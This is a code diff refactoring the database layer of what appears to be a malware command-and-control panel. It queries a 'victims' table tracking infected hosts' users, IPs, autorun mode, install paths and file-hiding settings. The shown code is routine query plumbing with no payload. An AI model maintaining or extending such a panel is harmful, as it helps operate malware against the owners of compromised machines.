@@ -55,32 +55,7 @@ func (d *DB) LoadVictimsFromDB() ([]*Victim, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 
-	rows, err := d.SQL().QueryContext(ctx, `
-		SELECT
-			id,
-			COALESCE(country, ''),
-			COALESCE(device_type, ''),
-			COALESCE(hostname, ''),
-			COALESCE("user", ''),
-			COALESCE("window", ''),
-			COALESCE(ip, ''),
-			COALESCE(comment, ''),
-			COALESCE(build_id, ''),
-			COALESCE(os, ''),
-			COALESCE(cpu, ''),
-			COALESCE(gpu, ''),
-			COALESCE(ram, ''),
-			COALESCE(last_active, 0),
-			online,
-			COALESCE(owner, ''),
-			admin,
-			COALESCE(build_version, ''),
-			COALESCE(startup_delay_sec, 0),
-			COALESCE(autorun_mode, ''),
-			COALESCE(install_path, ''),
-			COALESCE(hide_files_enabled, false)
-		FROM victims
-	`)
+	rows, err := d.SQL().QueryContext(ctx, `SELECT `+victimColumns+` FROM victims`)
 	if err != nil {
 		return nil, err
 	}
@@ -88,44 +63,11 @@ func (d *DB) LoadVictimsFromDB() ([]*Victim, error) {
 
 	var out []*Victim
 	for rows.Next() {
-		var v Victim
-		var lastActive int64
-		if err := rows.Scan(
-			&v.ID,
-			&v.Country,
-			&v.DeviceType,
-			&v.Hostname,
-			&v.User,
-			&v.Window,
-			&v.IP,
-			&v.Comment,
-			&v.BuildID,
-			&v.OS,
-			&v.CPU,
-			&v.GPU,
-			&v.RAM,
-			&lastActive,
-			&v.Online,
-			&v.Owner,
-			&v.Admin,
-			&v.BuildVersion,
-			&v.StartupDelaySeconds,
-			&v.AutorunMode,
-			&v.InstallPath,
-			&v.HideFilesEnabled,
-		); err != nil {
+		v, err := scanVictimRow(rows)
+		if err != nil {
 			return nil, err
 		}
-
-		v.Owner = strings.ToLower(strings.TrimSpace(v.Owner))
-		if lastActive > 1_000_000_000_000 {
-			v.LastActive = time.UnixMilli(lastActive)
-		} else if lastActive > 0 {
-			v.LastActive = time.Unix(lastActive, 0)
-		}
-
-		vv := v
-		out = append(out, &vv)
+		out = append(out, v)
 	}
 
 	if err := rows.Err(); err != nil {
@@ -298,83 +240,4 @@ func (d *DB) BanVictimID(id string) error {
 	return err
 }
 
-func (d *DB) GetVictimByID(id string) (*Victim, bool, error) {
-	id = strings.TrimSpace(id)
-	if id == "" {
-		return nil, false, nil
-	}
-	if d == nil || d.SQL() == nil {
-		return nil, false, errors.New("db is nil")
-	}
 
-	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-	defer cancel()
-
-	var v Victim
-	var lastActive int64
-	row := d.SQL().QueryRowContext(ctx, `
-		SELECT
-			id,
-			COALESCE(country, ''),
-			COALESCE(device_type, ''),
-			COALESCE(hostname, ''),
-			COALESCE("user", ''),
-			COALESCE("window", ''),
-			COALESCE(ip, ''),
-			COALESCE(comment, ''),
-			COALESCE(build_id, ''),
-			COALESCE(os, ''),
-			COALESCE(cpu, ''),
-			COALESCE(gpu, ''),
-			COALESCE(ram, ''),
-			COALESCE(last_active, 0),
-			online,
-			COALESCE(owner, ''),
-			admin,
-			COALESCE(build_version, ''),
-			COALESCE(startup_delay_sec, 0),
-			COALESCE(autorun_mode, ''),
-			COALESCE(install_path, ''),
-			COALESCE(hide_files_enabled, false)
-		FROM victims WHERE id = $1
-	`, id)
-	if err := row.Scan(
-		&v.ID,
-		&v.Country,
-		&v.DeviceType,
-		&v.Hostname,
-		&v.User,
-		&v.Window,
-		&v.IP,
-		&v.Comment,
-		&v.BuildID,
-		&v.OS,
-		&v.CPU,
-		&v.GPU,
-		&v.RAM,
-		&lastActive,
-		&v.Online,
-		&v.Owner,
-		&v.Admin,
-		&v.BuildVersion,
-		&v.StartupDelaySeconds,
-		&v.AutorunMode,
-		&v.InstallPath,
-		&v.HideFilesEnabled,
-	); err != nil {
-		if errors.Is(err, sql.ErrNoRows) {
-			return nil, false, nil
-		}
-		return nil, false, err
-	}
-
-	v.Owner = strings.ToLower(strings.TrimSpace(v.Owner))
-	if lastActive > 1_000_000_000_000 {
-		v.LastActive = time.UnixMilli(lastActive)
-	} else if lastActive > 0 {
-		v.LastActive = time.Unix(lastActive, 0)
-	}
-
-	vv := v
-	return &vv, true, nil
-}
